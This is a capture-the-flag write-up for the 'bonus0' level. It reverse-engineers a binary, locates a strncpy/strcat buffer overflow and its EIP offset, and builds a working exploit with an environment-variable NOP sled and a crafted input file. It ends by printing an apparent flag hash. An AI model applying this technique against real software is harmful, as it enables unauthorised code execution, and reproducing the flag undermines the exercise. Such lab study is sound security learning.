# 📦 Level: bonus0
## 🧪 Step 1: Program Behavior
```markdown
$ ./bonus0
 -
coucou
 -
coucou
coucou coucou
```
The program:
- Prompts for two inputs.
- Echoes them concatenated with a space in between.

## 🔍 Step 2: Reverse Engineering with GDB
#### `main` function:
```asm
call 0x804851e <pp>
call 0x80483b0 <puts@plt>
```
- Calls a function pp that handles inputs.

#### `pp` function:
```asm
call   0x80484b4 <p>
call   0x80484b4 <p>
...
call   0x80483a0 <strcpy@plt>    ; copy first input
...
call   0x8048390 <strcat@plt>    ; append second input
```
Two calls to p() to get input into stack buffers.

strcpy() and strcat() combine the buffers into a location pointed to by main.

Vulnerable function = p().

#### `p` function:
```asm
read(0, buffer, 0x1000);   // reads 4096 bytes from stdin
...
strncpy(dest, buffer, 0x14); // only copy 20 bytes to target buffer
```
💥 This creates a classic buffer overflow. We can overflow past the 20-byte strncpy() buffer.

## 🔥 Step 3: Triggering the Overflow
#### Fuzz to find the EIP offset:
Using a cyclic pattern, you determined:
- EIP offset starts at byte 9 in the second input (confirmed via SEGFAULT and EIP 0x41414141).

## 🧪 Step 4: Shellcode Injection via Environment
You stored the shellcode in an environment variable to bypass buffer size limitations:
```bash
export payload=$(python -c 'print "\x90"*500 + "<shellcode>"')
```
And you found the shellcode in memory at:
```
0xbffffe57
```

## 🎯 Step 5: Final Exploit
Input crafting:
```bash
python -c 'print "B"*4095 + "\n" + "A"*9 + "\x57\xfe\xff\xbf" + "B"*30' > /tmp/file
```
- First input: fills 4095 bytes.
- \n: separates the two inputs.
- Second input: 9 bytes to reach EIP, then your return address → into the NOP sled.
- Extra Bs: fill the rest.

Running the exploit:
```bash
$ cat /tmp/file - | env -i payload=$(python -c 'print "\x90"*500 + "<shellcode>"') ./bonus0
```
✅ You get a shell:

```bash
whoami
bonus1
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
- 🎉 Done!
